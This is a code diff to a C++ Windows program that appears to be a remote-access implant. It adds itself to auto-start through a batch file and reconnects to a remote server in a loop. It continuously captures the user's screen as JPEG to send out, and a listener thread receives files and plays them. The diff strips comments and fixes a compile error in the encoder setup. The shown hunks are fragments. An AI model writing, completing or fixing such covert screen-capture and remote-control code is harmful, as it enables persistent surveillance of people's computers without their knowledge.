@@ -106,7 +106,6 @@ void CommandListener(SOCKET s) {
             out.write(buf.data(), sz);
             out.close();
 
-            // close previous alias before re-opening
             mciSendStringA("close nyx", 0, 0, 0);
             mciSendStringA(("open \"" + f + "\" type mpegvideo alias nyx").c_str(), 0, 0, 0);
             mciSendStringA("play nyx", 0, 0, 0);
@@ -117,7 +116,6 @@ void CommandListener(SOCKET s) {
 // ── entry ──
 
 int main() {
-    // DPI awareness for accurate screen capture
     SetProcessDPIAware();
 
     // auto-start batch
@@ -131,11 +129,9 @@ int main() {
         bat.close();
     }
 
-    // init winsock once
     WSADATA wsa;
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;
 
-    // init gdi+ once
     Gdiplus::GdiplusStartupInput gdip;
     ULONG_PTR gdipTok;
     Gdiplus::GdiplusStartup(&gdipTok, &gdip, 0);
@@ -147,16 +143,14 @@ int main() {
         return 1;
     }
 
-    // JPEG quality encoder param
     Gdiplus::EncoderParameters eps;
     eps.Count = 1;
-    eps.Parameter[0].Guid.Guid = Gdiplus::EncoderQuality;
+    eps.Parameter[0].Guid = Gdiplus::EncoderQuality;  // <-- fixed
     eps.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
     eps.Parameter[0].NumberOfValues = 1;
     ULONG quality = 78;
     eps.Parameter[0].Value = &quality;
 
-    // ── reconnect loop ──
     while (true) {
         SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock == INVALID_SOCKET) { Sleep(5000); continue; }
@@ -169,7 +163,6 @@ int main() {
         if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
             std::thread(CommandListener, sock).detach();
 
-            // ── screen capture loop ──
             while (true) {
                 HDC hdcScr = GetDC(NULL);
                 int w = GetSystemMetrics(SM_CXSCREEN);
@@ -180,7 +173,6 @@ int main() {
                 HBITMAP oldBmp = (HBITMAP)SelectObject(mem, bmp);
                 BitBlt(mem, 0, 0, w, h, hdcScr, 0, 0, SRCCOPY);
 
-                // save to JPEG while HBITMAP is still alive
                 IStream* strm = 0;
                 CreateStreamOnHGlobal(0, TRUE, &strm);
                 {
@@ -188,13 +180,11 @@ int main() {
                     gdibmp.Save(strm, &jpegClsid, &eps);
                 }
 
-                // now safe to clean up GDI
                 SelectObject(mem, oldBmp);
                 DeleteObject(bmp);
                 DeleteDC(mem);
                 ReleaseDC(NULL, hdcScr);
 
-                // read stream → buffer
                 STATSTG st;
                 strm->Stat(&st, STATFLAG_NONAME);
                 ULONG len = st.cbSize.LowPart;
